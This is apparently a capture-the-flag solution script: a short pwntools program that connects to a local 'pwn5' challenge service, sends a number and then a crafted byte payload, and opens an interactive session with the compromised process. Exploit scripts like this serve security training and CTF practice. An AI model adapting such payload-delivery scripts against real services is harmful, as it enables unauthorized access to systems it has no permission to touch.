from pwn import *

# context(log_level="debug")
# p = process('./pwn5')
p = remote('127.0.0.1',10001)
p.recvuntil('\n')
p.sendline('1234')
p.recvuntil('\n')
p.sendline('\x64\x1f\x08\x19\x1a')
p.interactive()